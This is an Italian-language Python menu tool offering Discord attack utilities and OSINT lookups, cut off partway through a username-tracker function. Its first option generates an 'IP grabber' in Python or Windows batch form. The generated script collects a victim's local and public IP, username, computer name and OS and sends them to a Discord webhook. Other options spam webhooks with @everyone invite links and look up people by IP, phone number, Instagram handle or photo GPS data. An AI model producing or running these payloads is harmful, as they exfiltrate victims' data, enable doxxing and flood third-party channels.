import os
import sys
import time
import random
import string
import requests
import ctypes
import hashlib
import socket
import ssl
import json
import re

RESET = "\033[0m"
BOLD = "\033[1m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BLUE = "\033[94m"

def check_dependencies():
    dependencies = {
        'requests': 'requests',
        'PIL': 'pillow',
        'whois': 'whois',
        'discord': 'discord.py'
    }
    for module, package in dependencies.items():
        try:
            __import__(module)
        except ImportError:
            print(f"{YELLOW}Installing {package}...{RESET}")
            os.system(f"{sys.executable} -m pip install {package}")
            print(f"{GREEN}{package} installed successfully.{RESET}")

def set_fullscreen():
    
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        SW_MAXIMIZE = 3
        hWnd = kernel32.GetConsoleWindow()
        user32.ShowWindow(hWnd, SW_MAXIMIZE)
       
        VK_MENU = 0x12  
        VK_RETURN = 0x0D  # ENTER
        user32.keybd_event(VK_MENU, 0, 0, 0)
        user32.keybd_event(VK_RETURN, 0, 0, 0)
        user32.keybd_event(VK_RETURN, 0, 2, 0)
        user32.keybd_event(VK_MENU, 0, 2, 0)
    except Exception:
        pass

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii_fade(ascii_art, delay=0.05):
    for line in ascii_art.splitlines():
        print(line)
        time.sleep(delay)

def print_section_title(title):
    print()
    for char in title:
        print(f"{RED}{BOLD}{char}{RESET}", end='', flush=True)
        time.sleep(0.01)
    print("\n")

def dedsec_ascii_art():
    ascii_art = """
████████▄     ▄████████ ████████▄     ▄████████    ▄████████  ▄████████            ▄████████  ▄██████▄  
███   ▀███   ███    ███ ███   ▀███   ███    ███   ███    ███ ███    ███           ███    ███ ███    ███ 
███    ███   ███    █▀  ███    ███   ███    █▀    ███    █▀  ███    █▀            ███    █▀  ███    ███ 
███    ███  ▄███▄▄▄     ███    ███   ███         ▄███▄▄▄     ███                  ███        ███    ███ 
███    ███ ▀▀███▀▀▀     ███    ███ ▀███████████ ▀▀███▀▀▀     ███                  ███        ███    ███ 
███    ███   ███    █▄  ███    ███          ███   ███    █▄  ███    █▄            ███    █▄  ███    ███ 
███   ▄███   ███    ███ ███   ▄███    ▄█    ███   ███    ███ ███    ███           ███    ███ ███    ███ 
████████▀    ██████████ ████████▀   ▄████████▀    ██████████ ████████▀            ████████▀   ▀██████▀  
                                                                                                        
"""
    print_ascii_fade(ascii_art, delay=0.03)

def tiger_ascii_art():
    ascii_art = """
                              :**+ :::+*@@.
                              +: @ = =.  :#@@@@@@@@                 :     .=*@@#     -
                 @@@@-. :=: +@@.:% *=@@:   @@@@@@          :#=::     .:@=@@@@@@@@@@@@@@@@@@@@--.-:
             .#@@@@@@@@@@@@@@@@@@:# .@@   #@@    :@-     +@@:@@@+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*
             #*   :%@@@@@@@@@@:   .@@#*              ..  ##@ *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-:- %=
                   *@@@@@@@@@@@@%@@@@@@@            = @=+@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   #.
                   #@@@@@@@@@##@@@@@= =#              #@@@#@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
                  @@@@@@@@@@@#+#@@=                 :@@@-.#-*#@.  .@@.=%@@@@%@@@@@@@@@@@@@@@@@=  +
                 :@@@@@@@@@@@@@@:                   :@@    # - @@@@@@@ =@@@*#*@@@@@@@@@@@@@=.=-  #:
                  :@@@@@@@@@@@+                     @@@@@@@: :    @@@@@@@@@@@@@@@@@@@@@@@@@@@
                   #@@@@@    @                     #%@@@@@@@@@@@@@@@@@:@@@@@@@@@@@@#@@@@@@@@@:
                     @@@     .                    @@@@@@@@@@@@@@@@-%@@@%@#   @@@@@@#=@#@@@@@==
                     =@@##@   =:*.                @@@@@@*@@@@@@@@@@-=@@@@.    +@@@:  %#@@#=   :
                         .=@.                     #@@@@@@@@#@@@@@@@@+#:        %@      *%@=
                            . @@@@@@               @#@@*@@@@@@@@@@@@@@@=        :-     -       =.
                             :@@@@@@@#=                   @@@@@@@@@@@@-               :+%  .@=
                            -@@@@@@@@@@@@                 @+@@@@*+@@#                   @. @@.#   # :
                             @@@@@@@@@@@@@@@               @@@@@*@@@                     :=.        @@@.
                              @@@@@@@@@@@@@                #@@@@@@%@.                             :  :
                               *@@@@@@@@@@%               :@@@@@@@@@ @@.                      .#@@@@@@@@@@
                                :@@@@@@@@@                 #@@@@@@   @:                    .#@@@@@@@@@@@*
                                :@@@@%@@                   .@@@@@-   .                     @@@@#@@@@@@@
                                :@@@@@@.                    *@@@-                          @@@@#@@@@@@@
                                .@@@@@                                                           =@@@:    @=
                                 =@@                                                              =    #+
                                  @%
    """
    print_ascii_fade(ascii_art, delay=0.05)

def grabber_ascii_art():
    ascii_art = """
                                                        ...
                                                  +%@@@@@@@@@@@@@*.
                                               #@@@@@@@@@@@@@@@@@@@@@:
                                             %@@@@@@@@@@@@@@@@@@@@@@@@@:
                                           .@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
                                           :@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                           :@@@@@@@@@@@@@@@@@@@@@@@@@@@@*
                                            #@@@%.     .@@@@+      #@@@%
                                             +@@=      .@@@@=      .@@#
                                              @@@@%%%@@@@%*@@@@%%%@@@@=
                                             .@@@@@@@@@@*  -@@@@@@@@@@=
                                           .    .::-@@@@@@@@@@@@+::.    .
                                         *@@@@#     @@@@@@@@@@@@-    +@@@@@.
                                         #@@@@@%    -%@@@@@@@@%=.   *@@@@@@:
                                       @@@@@@@@@@@@:            .#@@@@@@@@@@@-
                                       +@@@@@*#@@@@@@@@*:  .+@@@@@@@@%*%@@@@#
                                                    *@@@@@@@@@@%.
                                        .==.    .+%@@@@@@@%@@@@@@@+:     :=:
                                       @@@@@@@@@@@@@@*.       :@@@@@@@@@@@@@@=
                                       -@@@@@@@@%=                :#@@@@@@@@*
                                         *@@@@@:                     %@@@@@:
                                         :%@@%.                       *@@@=
    """
    print_ascii_fade(ascii_art, delay=0.05)

def webhook_ascii_art():
    ascii_art = """
                                     @@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@
                                   @%@@@@@@@                            @@@@@@%%@
                                         @@                              @@
    """
    print_ascii_fade(ascii_art, delay=0.05)

def special_ascii_art():
    ascii_art = """
                                          ...:----:...
                                     .:=#@@@@@@@@@@@@@@%*-..
                                  .:#@@@@@@@%#*****#%@@@@@@@+..
                               ..-@@@@@%-...... ........+@@@@@@..
                               :%@@@@=..   .#@@@@@@@@#=....+@@@@*.
                             .+@@@@=.      .*@@@%@@@@@@@@=...*@@@@:.
                            .#@@@%.                 .=@@@@@=. .@@@@-.
                           .=@@@#.                    .:%@@@*. -@@@%:.
                           .%@@@-                       .*@@*. .+@@@=.
                           :@@@#.                              .-@@@#.
                           -@@@#                                :%@@@.
                           :@@@#.                              .-@@@#.
                           .%@@@-.                             .+@@@=.
                           .+@@@#.                             -@@@%:.
                            .*@@@%.                          .:@@@@-.
                             .+@@@@=..                     ..*@@@@:.
                               :%@@@@-..                ...+@@@@*.
                               ..-@@@@@%=...         ...*@@@@@@@@#.
                                  .:*@@@@@@@%*++++**@@@@@@@@=:*@@@@#:.
                                     ..=%@@@@@@@@@@@@@@%#-.   ..*@@@@%:.
                                        .....:::::::....       ...+@@@@%:
                                                                  ..+@@@@%-.
                                                                    ..=@@@@%-.
                                                                      ..=@@@@@=.
                                                                         .=%@@@@=.
                                                                          ..-%@@@-.
                                                                             ....
    """
    print_ascii_fade(ascii_art, delay=0.03)

def logo_banner():
    banner = f"""{PURPLE}{BOLD}
                                                                                                                                                                                                                                               
  ___   _____ ____  ____   ______  ______   ___    ___   _      __  _  ____  ______ 
 /   \ / ___/|    ||    \ |      ||      | /   \  /   \ | |    |  |/ ]|    ||      |
|     (   \_  |  | |  _  ||      ||      ||     ||     || |    |  ' /  |  | |      |
|  O  |\__  | |  | |  |  ||_|  |_||_|  |_||  O  ||  O  || |___ |    \  |  | |_|  |_|
|     |/  \ | |  | |  |  |  |  |    |  |  |     ||     ||     ||     \ |  |   |  |  
|     |\    | |  | |  |  |  |  |    |  |  |     ||     ||     ||  .  | |  |   |  |  
 \___/  \___||____||__|__|  |__|    |__|   \___/  \___/ |_____||__|\_||____|  |__|  
                                                                                                         
                                                                   
                                                                      
                                                                  {RESET}
                                                      {RESET}
{RED}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                              ║
║{RESET}{BOLD}{PURPLE}      this is not a powerlful thing. and if you paid for this, well, you've been scammed{RESET}{BLUE}                 ║ 
║                                                                                                                              ║         {BOLD}{PURPLE}VERSION 1.0{RESET}         
║                                                                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{RESET}
"""
    print(banner)
    for i in range(6):
        print(f"{RED}{' ' * (10 + i*2)}{'▄' * (60 - i*4)}{RESET}")
        time.sleep(0.05)
    print()

def wait_enter():
    input(f"\n{CYAN}Premi INVIO per continuare...{RESET}")

def menu():
    clear()
    logo_banner()
    while True:
        print_section_title("========== SEZIONE 1: DISCORD TOOL ==========")
        print(f"{PURPLE}1{RESET} - Generatore script IP grabber via Discord Webhook")
        print(f"{PURPLE}2{RESET} - Webhook spammer (testo personalizzato)")
        print(f"{PURPLE}3{RESET} - Webhook spammer (messaggi random)")
        print(f"{PURPLE}4{RESET} - Discord Bot Sender (messaggi custom via ID canale)")
        print_section_title("========== SEZIONE 2: OSINT TOOL ==========")
        print(f"{PURPLE}5{RESET} - Info dettagliate da indirizzo IP pubblico")
        print(f"{PURPLE}6{RESET} - Info dettagliate da numero di telefono")
        print(f"{PURPLE}7{RESET} - Generatore di IP pubblici casuali")
        print(f"{PURPLE}8{RESET} - Info da username Instagram")
        print(f"{PURPLE}9{RESET} - OSINT su foto (metadati/localizzazione)")
        print(f"{PURPLE}10{RESET} - Username tracker ")
        print(f"{PURPLE}11{RESET} - Email tracker ")
        print_section_title("========== SEZIONE 3: UTILITY ==========")
        print(f"{PURPLE}12{RESET} - Generatore password sicure")
        print(f"{PURPLE}13{RESET} - Generatore username creativi")
        print(f"{PURPLE}14{RESET} - Convertitore testo in base64")
        print(f"{PURPLE}15{RESET} - Calcolatrice avanzata")
        print_section_title("========== SEZIONE 4: WEBSITE TOOLS ==========")
        print(f"{PURPLE}16{RESET} - Website info scanner (menu con opzioni)")
        print(f"{PURPLE}17{RESET} - Vulnerability scanner per siti web")
        print(f"{PURPLE}0{RESET} - Esci\n")
        scelta = input(f"{CYAN}Seleziona un tool (1-17, 0): {RESET}").strip()
        if scelta == "1":
            ip_grabber_script_tool()
            wait_enter()
        elif scelta == "2":
            webhook_spammer_tool()
            wait_enter()
        elif scelta == "3":
            webhook_spammer_tool(custom=False)
            wait_enter()
        elif scelta == "4":
            discord_bot_sender_tool()
            wait_enter()
        elif scelta == "5":
            ip_info_tool()
            wait_enter()
        elif scelta == "6":
            phone_info_tool()
            wait_enter()
        elif scelta == "7":
            ip_generator_tool()
            wait_enter()
        elif scelta == "8":
            instagram_info_tool()
            wait_enter()
        elif scelta == "9":
            photo_osint_tool()
            wait_enter()
        elif scelta == "10":
            username_tracker_tool()
            wait_enter()
        elif scelta == "11":
            email_tracker_tool()
            wait_enter()
        elif scelta == "12":
            password_generator_tool()
            wait_enter()
        elif scelta == "13":
            username_generator_tool()
            wait_enter()
        elif scelta == "14":
            base64_converter_tool()
            wait_enter()
        elif scelta == "15":
            calculator_tool()
            wait_enter()
        elif scelta == "16":
            website_info_scanner_menu()
            wait_enter()
        elif scelta == "17":
            vulnerability_scanner_tool()
            wait_enter()
        elif scelta == "0":
            print(f"{GREEN}Arrivederci!{RESET}")
            time.sleep(1)
            break
        else:
            print(f"{RED}Scelta non valida.{RESET}")
            time.sleep(1)


def ip_grabber_script_tool():
    clear()
    grabber_ascii_art()
    print(f"{BOLD}{CYAN}== Generatore IP grabber via Discord Webhook =={RESET}")
    webhook = input("Inserisci il Discord Webhook URL (dove inviare il file): ").strip()
    formato = ""
    while formato not in ["1", "2"]:
        print(f"\nScegli il formato del file da generare:")
        print(f"{PURPLE}1{RESET} - Python (.py)")
        print(f"{PURPLE}2{RESET} - Batch Windows (.bat)")
        formato = input(f"{CYAN}Seleziona un'opzione (1/2): {RESET}").strip()
    filename = input("Nome file da creare e inviare (senza estensione): ").strip()
    if not filename:
        filename = "ip_grabber"

    if formato == "1":
        filename_py = filename if filename.endswith(".py") else filename + ".py"
        script = f'''import socket 
import requests
import platform
import getpass

WEBHOOK_URL = "{webhook}"

def get_local_ip_and_port():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip, port = s.getsockname()
        s.close()
        return ip, port
    except Exception:
        return "N/A", "N/A"

def get_public_ip_and_port():
    try:
        # La porta locale usata per la connessione TCP sarà la porta pubblica (sorgente) vista dal server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("api.ipify.org", 80))
        local_ip, local_port = s.getsockname()
        s.close()
        public_ip = requests.get("https://api.ipify.org").text
        return public_ip, local_port
    except Exception:
        return "N/A", "N/A"

def send_info_to_discord(local_ip, local_port, public_ip, public_port, user, pc, os_ver):
    msg = (
        "**IP Grabber Python**\\n"
        f"**Utente:** {{user}} su {{pc}}\\n"
        f"**IP Locale:** {{local_ip}}\\n"
        f"**Porta locale:** {{local_port}}\\n"
        f"**IP Pubblico:** {{public_ip}}\\n"
        f"**Porta pubblica (sorgente):** {{public_port}}\\n"
        f"**OS:** {{os_ver}}"
    )
    data = {{"content": msg}}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Errore nell'invio al webhook: {{e}}")

if __name__ == "__main__":
    local_ip, local_port = get_local_ip_and_port()
    public_ip, public_port = get_public_ip_and_port()
    user = getpass.getuser()
    pc = platform.node()
    os_ver = platform.platform()
    send_info_to_discord(local_ip, local_port, public_ip, public_port, user, pc, os_ver)
    print("Fatto.")
'''
        try:
            with open(filename_py, "w", encoding="utf-8") as f:
                f.write(script)
            print(f"{GREEN}Script creato con successo: {filename_py}{RESET}")

            with open(filename_py, "rb") as f:
                files = {"file": (filename_py, f, "text/x-python")}
                response = requests.post(webhook, files=files)
                if response.status_code in (200, 204):
                    print(f"{GREEN}File inviato con successo al webhook!{RESET}")
                else:
                    print(f"{RED}Errore nell'invio al webhook: {response.status_code} - {response.text}{RESET}")
        except Exception as e:
            print(f"{RED}Errore nella creazione o invio del file: {e}{RESET}")

    elif formato == "2":
        filename_bat = filename if filename.endswith(".bat") else filename + ".bat"
        bat_content = f"""@echo off
setlocal enabledelayedexpansion

REM Ottieni IP locale
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do set LOCAL_IP=%%a
set LOCAL_IP=!LOCAL_IP:~1!

REM Ottieni IP pubblico
for /f "delims=" %%i in ('curl -s https://api.ipify.org') do set PUBLIC_IP=%%i

REM Ottieni nome utente e computer
set USERNAME=%USERNAME%
set COMPUTERNAME=%COMPUTERNAME%

REM Ottieni sistema operativo
ver > tmpver.txt
set /p OS_VER=<tmpver.txt
del tmpver.txt

REM Le porte non sono ottenibili in batch puro, quindi vengono simulate
set /a LOCAL_PORT=%RANDOM% + 1024
set /a PUBLIC_PORT=%RANDOM% + 1024

REM Prepara messaggio JSON con formattazione chiara
set MSG=**IP Grabber Batch**\\n
set MSG=!MSG!**Utente:** !USERNAME! su !COMPUTERNAME!\\n
set MSG=!MSG!**IP Locale:** !LOCAL_IP!\\n
set MSG=!MSG!**Porta locale :** !LOCAL_PORT!\\n
set MSG=!MSG!**IP Pubblico:** !PUBLIC_IP!\\n
set MSG=!MSG!**Porta pubblica :** !PUBLIC_PORT!\\n
set MSG=!MSG!**OS:** !OS_VER!

REM Invia al webhook Discord
curl -H "Content-Type: application/json" -X POST -d "{{\\"content\\": \\"!MSG!\\"}}" {webhook}

pause
"""
        try:
            with open(filename_bat, "w", encoding="utf-8") as f:
                f.write(bat_content)
            print(f"{GREEN}File batch creato con successo: {filename_bat}{RESET}")

            # Invia il file batch al webhook
            with open(filename_bat, "rb") as f:
                files = {"file": (filename_bat, f, "text/x-batch")}
                response = requests.post(webhook, files=files)
                if response.status_code in (200, 204):
                    print(f"{GREEN}File batch inviato con successo al webhook!{RESET}")
                else:
                    print(f"{RED}Errore nell'invio al webhook: {response.status_code} - {response.text}{RESET}")
        except Exception as e:
            print(f"{RED}Errore nella creazione o invio del file: {e}{RESET}")
            input("Premi invio per continuare...")
def webhook_spammer_tool(custom=True):
    clear()
    webhook_ascii_art()
    print(f"{BOLD}{CYAN}== Webhook spammer =={RESET}")
    webhook = input("Inserisci il Discord Webhook URL: ").strip()
    if custom:
        message = input("Messaggio da inviare: ").strip()
    else:
        messages = [
            "@everyone https://discord.gg/fSSdWcgqpb", "@everyone https://discord.gg/fSSdWcgqpb", "@everyone https://discord.gg/fSSdWcgqpb", "@everyone https://discord.gg/fSSdWcgqpb", "@everyone https://discord.gg/fSSdWcgqpb", "@everyone https://discord.gg/fSSdWcgqpb"
        ]
    try:
        count = int(input("Quanti messaggi vuoi inviare? (nessun limite): ").strip())
    except:
        count = 10
    try:
        delay = float(input("Delay tra i messaggi in secondi (0 per nessun delay): ").strip())
    except:
        delay = 0
    for i in range(count):
        if custom:
            data = {"content": message}
        else:
            data = {"content": random.choice(messages)}
        try:
            requests.post(webhook, json=data)
            print(f"{GREEN}Inviato messaggio {i+1}{RESET}")
        except Exception as e:
            print(f"{RED}Errore: {e}{RESET}")
        if delay > 0:
            time.sleep(delay)

def discord_bot_sender_tool():
    clear()
    webhook_ascii_art()
    print(f"{BOLD}{CYAN}== Discord Bot Sender (messaggi custom via ID canale) =={RESET}")
    print(f"{YELLOW}Invia un messaggio personalizzato su Discord tramite un bot.{RESET}")
    print(f"{CYAN}Assicurati di aver creato un bot su https://discord.com/developers/applications e di averlo aggiunto al server con i permessi di invio messaggi.{RESET}\n")
    import discord

    token = input("Inserisci il token del bot: ").strip()
    channel_id = input("Inserisci l'ID del canale: ").strip()
    message = input("Messaggio da inviare: ").strip()

    class SenderClient(discord.Client):
        async def on_ready(self):
            try:
                channel = self.get_channel(int(channel_id))
                if channel is None:
                    print(f"{RED}Canale non trovato! Controlla l'ID.{RESET}")
                else:
                    await channel.send(message)
                    print(f"{GREEN}Messaggio inviato con successo!{RESET}")
            except Exception as e:
                print(f"{RED}Errore: {e}{RESET}")
            await self.close()

    intents = discord.Intents.default()
    client = SenderClient(intents=intents)
    try:
        client.run(token)
    except Exception as e:
        print(f"{RED}Errore di autenticazione o connessione: {e}{RESET}")

def ip_info_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Info dettagliate da indirizzo IP pubblico =={RESET}")
    ip = input("Inserisci l'indirizzo IP pubblico: ").strip()
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse,mobile,proxy,hosting")
        data = response.json() 
        if data['status'] == 'success':
            print(f"\n{BOLD}Informazioni per l'indirizzo IP: {ip}{RESET}\n")
            print(f"{YELLOW}Paese:{RESET} {data.get('country', 'N/A')}")
            print(f"{YELLOW}Regione:{RESET} {data.get('regionName', 'N/A')}")
            print(f"{YELLOW}Città:{RESET} {data.get('city', 'N/A')}")
            print(f"{YELLOW}CAP:{RESET} {data.get('zip', 'N/A')}")
            print(f"{YELLOW}Latitudine:{RESET} {data.get('lat', 'N/A')}")
            print(f"{YELLOW}Longitudine:{RESET} {data.get('lon', 'N/A')}")
            print(f"{YELLOW}Fuso orario:{RESET} {data.get('timezone', 'N/A')}")
            print(f"{YELLOW}ISP:{RESET} {data.get('isp', 'N/A')}")
            print(f"{YELLOW}Organizzazione:{RESET} {data.get('org', 'N/A')}")
            print(f"{YELLOW}AS:{RESET} {data.get('as', 'N/A')}")
            print(f"{YELLOW}Reverse DNS:{RESET} {data.get('reverse', 'N/A')}")
            print(f"{YELLOW}Mobile:{RESET} {data.get('mobile', 'N/A')}")
            print(f"{YELLOW}Proxy:{RESET} {data.get('proxy', 'N/A')}")
            print(f"{YELLOW}Hosting:{RESET} {data.get('hosting', 'N/A')}")
           
            import socket
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, 80))
                if result == 0:
                    local_port = sock.getsockname()[1]
                    print(f"{CYAN}Porta locale usata per la connessione a {ip}: {local_port}{RESET}")
                else:
                    print(f"{RED}Non è stato possibile connettersi alla porta 80 di {ip} per determinare la porta locale.{RESET}")
                sock.close()
            except Exception as e:
                print(f"{RED}Errore nel determinare la porta locale: {e}{RESET}")
        else:
            print(f"{RED}Errore: {data.get('message', 'Impossibile ottenere informazioni.')}{RESET}")
    except Exception as e:
        print(f"{RED}Errore durante la richiesta: {e}{RESET}")

def phone_info_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Info dettagliate da numero di telefono =={RESET}")
    phone = input("Inserisci il numero di telefono (con prefisso internazionale, es: +393401234567): ").strip()
    try:
        API_KEY = "INSERISCI_LA_TUA_API_KEY"
        url = f"http://apilayer.net/api/validate?access_key={API_KEY}&number={phone}&country_code=&format=1"
        response = requests.get(url)
        data = response.json()
        if data.get("valid"):
            print(f"\n{BOLD}Informazioni per il numero: {phone}{RESET}\n")
            print(f"{YELLOW}Paese:{RESET} {data.get('country_name', 'N/A')}")
            print(f"{YELLOW}Prefisso internazionale:{RESET} {data.get('country_prefix', 'N/A')}")
            print(f"{YELLOW}Localizzazione:{RESET} {data.get('location', 'N/A')}")
            print(f"{YELLOW}Carrier:{RESET} {data.get('carrier', 'N/A')}")
            print(f"{YELLOW}Tipo di linea:{RESET} {data.get('line_type', 'N/A')}")
        else:
            print(f"{RED}Numero non valido o informazioni non disponibili.{RESET}")
    except Exception as e:
        print(f"{RED}Errore durante la richiesta: {e}{RESET}")

def ip_generator_tool():
    clear()
    print(f"{BOLD}{CYAN}== Generatore di IP pubblici casuali =={RESET}")
    n = input("Quanti IP vuoi generare? (default 10): ").strip()
    try:
        n = int(n)
    except:
        n = 10
    for _ in range(n):
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        print(f"{GREEN}{ip}{RESET}")

def instagram_info_tool():
    clear()
    special_ascii_art()
    print(f"{BOLD}{CYAN}== Info da username Instagram =={RESET}")
    username = input("Inserisci l'username Instagram: ").strip().lstrip("@")
    url = f"https://www.instagram.com/{username}/"
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    try:
        resp = requests.get(url, headers=headers)
        if resp.status_code != 200:
            print(f"{RED}Utente non trovato o profilo privato/inaccessibile!{RESET}")
            return
        match = re.search(r'window\._sharedData = (.*?);</script>', resp.text)
        if not match:
            print(f"{RED}Impossibile estrarre i dati pubblici!{RESET}")
            return
        data = json.loads(match.group(1))
        user = data["entry_data"]["ProfilePage"][0]["graphql"]["user"]
        print(f"\n{BOLD}Informazioni pubbliche per @{username}:{RESET}\n")
        print(f"{YELLOW}Nome completo:{RESET} {user.get('full_name','')}")
        print(f"{YELLOW}Bio:{RESET} {user.get('biography','')}")
        print(f"{YELLOW}Followers:{RESET} {user.get('edge_followed_by',{}).get('count','')}")
        print(f"{YELLOW}Seguiti:{RESET} {user.get('edge_follow',{}).get('count','')}")
        print(f"{YELLOW}Numero post:{RESET} {user.get('edge_owner_to_timeline_media',{}).get('count','')}")
        print(f"{YELLOW}Profilo privato?:{RESET} {user.get('is_private','')}")
        print(f"{YELLOW}Profilo verificato?:{RESET} {user.get('is_verified','')}")
        print(f"{YELLOW}Foto profilo:{RESET} {user.get('profile_pic_url_hd','')}")
        print(f"{YELLOW}ID utente:{RESET} {user.get('id','')}")
        print(f"{YELLOW}URL profilo:{RESET} {url}")
    except Exception as e:
        print(f"{RED}Errore: {e}{RESET}")

def photo_osint_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== OSINT su foto: estrazione metadati e localizzazione =={RESET}")
    print("Inserisci il percorso della foto (es: C:\\Users\\nome\\Desktop\\foto.jpg):")
    path = input("> ").strip('"')
    if not os.path.isfile(path):
        print(f"{RED}File non trovato!{RESET}")
        return
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS

    def get_exif_data(img):
        exif = img._getexif()
        if not exif:
            return {}
        exif_data = {}
        for tag, value in exif.items():
            decoded = TAGS.get(tag, tag)
            exif_data[decoded] = value
        return exif_data

    def get_gps_info(exif_data):
        gps_info = exif_data.get("GPSInfo")
        if not gps_info:
            return None
        gps_data = {}
        for key in gps_info.keys():
            decode = GPSTAGS.get(key, key)
            gps_data[decode] = gps_info[key]
        return gps_data

    def dms_to_decimal(dms, ref):
        degrees = dms[0][0] / dms[0][1]
        minutes = dms[1][0] / dms[1][1]
        seconds = dms[2][0] / dms[2][1]
        decimal = degrees + (minutes / 60.0) + (seconds / 3600.0)
        if ref in ['S', 'W']:
            decimal = -decimal
        return decimal

    try:
        img = Image.open(path)
        exif_data = get_exif_data(img)
        if not exif_data:
            print(f"{YELLOW}Nessun metadato EXIF trovato nella foto.{RESET}")
            return
        print(f"{GREEN}Metadati EXIF trovati:{RESET}")
        for k, v in exif_data.items():
            if k != "GPSInfo":
                print(f"{YELLOW}{k}:{RESET} {v}")
        gps_data = get_gps_info(exif_data)
        if gps_data:
            print(f"\n{CYAN}Dati GPS trovati!{RESET}")
            lat = gps_data.get("GPSLatitude")
            lat_ref = gps_data.get("GPSLatitudeRef")
            lon = gps_data.get("GPSLongitude")
            lon_ref = gps_data.get("GPSLongitudeRef")
            if lat and lat_ref and lon and lon_ref:
                lat_decimal = dms_to_decimal(lat, lat_ref)
                lon_decimal = dms_to_decimal(lon, lon_ref)
                print(f"{GREEN}Localizzazione approssimativa:{RESET}")
                print(f" - Latitudine: {lat_decimal}")
                print(f" - Longitudine: {lon_decimal}")
                print(f"{CYAN}Google Maps: https://maps.google.com/?q={lat_decimal},{lon_decimal}{RESET}")
            else:
                print(f"{YELLOW}Dati GPS incompleti nei metadati.{RESET}")
        else:
            print(f"{YELLOW}Nessun dato GPS trovato nei metadati.{RESET}")
    except Exception as e:
        print(f"{RED}Errore durante l'analisi della foto: {e}{RESET}")

def username_tracker_tool():
    clear()
    special_ascii_art()
    print(f"{BOLD}{CYAN}== Username tracker (ricerca su molti siti) =={RESET}")
    username = input("Inserisci l'username da cercare: ").strip()
    sites = {
        "Instagram": f"https://instagram.com/{username}",
        "Twitter/X": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "Pinterest": f"https://www.pinterest.com/{username}/",
        "Facebook": f"https://www.facebook.com/{username}",
        "YouTube": f"https://www.youtube.com/@{username}",
    }
    print(f"\n{CYAN}Risultati:{RESET}")
    for name, url in sites.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                print(f"{GREEN}[✓] {name}: trovato! {url}{RESET}")
            elif r.status_code == 404:
                print(f"{RED}[✗] {name}: non trovato.{RESET}")
            else:
